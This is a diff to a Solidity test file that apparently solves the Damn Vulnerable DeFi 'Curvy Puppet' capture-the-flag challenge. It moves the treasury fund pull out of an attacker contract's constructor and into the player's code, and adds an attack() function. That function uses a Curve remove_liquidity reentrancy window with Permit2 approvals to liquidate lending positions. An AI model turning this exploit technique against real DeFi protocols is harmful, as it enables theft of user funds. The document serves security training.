@@ -195,9 +195,19 @@ contract CurvyPuppetChallenge is Test {
      * =========================================================
      */
     function test_curvyPuppet() public checkSolvedByPlayer {
-        new CurvyPuppetAttacker{value: 0}(
+        // Deploy the attacker (constructor only stores references — no fund pulls).
+        CurvyPuppetAttacker attacker = new CurvyPuppetAttacker(
             dvt, lending, curvePool, weth, permit2, treasury, alice, bob, charlie
         );
+
+        // The treasury approved the PLAYER (not the attacker) to move its assets,
+        // so the player performs the transferFrom, pulling treasury funds into the attacker.
+        IERC20 lpToken = IERC20(curvePool.lp_token());
+        weth.transferFrom(treasury, address(attacker), weth.balanceOf(treasury));
+        lpToken.transferFrom(treasury, address(attacker), lpToken.balanceOf(treasury));
+
+        // Run the exploit now that the attacker holds the funds.
+        attacker.attack();
     }
 
     /**
@@ -295,19 +305,21 @@ contract CurvyPuppetAttacker {
         bob       = _bob;
         charlie   = _charlie;
         lpToken   = IERC20(_curvePool.lp_token());
+    }
 
-        // Step 1: Pull all treasury funds — WETH and LP tokens
-        uint256 wethBalance = weth.balanceOf(treasury);
-        uint256 lpBalance   = lpToken.balanceOf(treasury);
-        weth.transferFrom(treasury, address(this), wethBalance);
-        lpToken.transferFrom(treasury, address(this), lpBalance);
-
-        // Step 2: Unwrap all WETH → ETH and add to Curve pool
+    /**
+     * @notice Runs the exploit. Called by the player AFTER treasury WETH + LP
+     *         have been transferred into this contract (the player holds the
+     *         treasury allowance, so the player does the transferFrom, not us).
+     */
+    function attack() external {
+        // Step 1: Unwrap all WETH → ETH and add to the Curve pool
+        uint256 wethBalance = weth.balanceOf(address(this));
         weth.withdraw(wethBalance);
         uint256[2] memory amounts = [address(this).balance, uint256(0)];
         curvePool.add_liquidity{value: address(this).balance}(amounts, 0);
 
-        // Step 3: Set Permit2 approvals for LP token transfers BEFORE the reentrancy window
+        // Step 2: Set Permit2 approvals for LP token transfers BEFORE the reentrancy window
         // liquidate() calls _pullAssets() which uses permit2.transferFrom — must be approved first
         // Cannot set approvals from inside receive() as permit2.approve is not reentrant-safe
         uint256 totalLpNeeded = 3e18; // 3 users × 1e18 LP borrow each
@@ -319,15 +331,15 @@ contract CurvyPuppetAttacker {
             expiration: uint48(block.timestamp + 1 days)
         });
 
-        // Step 4: Trigger remove_liquidity() — Curve sends ETH → receive() fires (reentrancy window)
+        // Step 3: Trigger remove_liquidity() — Curve sends ETH → receive() fires (reentrancy window)
         uint256 lpToRemove = lpToken.balanceOf(address(this));
         uint256[2] memory minAmounts = [uint256(0), uint256(0)];
         curvePool.remove_liquidity(lpToRemove, minAmounts);
 
-        // Step 5: Wrap remaining ETH back to WETH
+        // Step 4: Wrap remaining ETH back to WETH
         weth.deposit{value: address(this).balance}();
 
-        // Step 6: Transfer everything back to treasury
+        // Step 5: Transfer everything back to treasury
         dvt.transfer(treasury, dvt.balanceOf(address(this)));
         weth.transfer(treasury, weth.balanceOf(address(this)));
         uint256 remainingLp = lpToken.balanceOf(address(this));
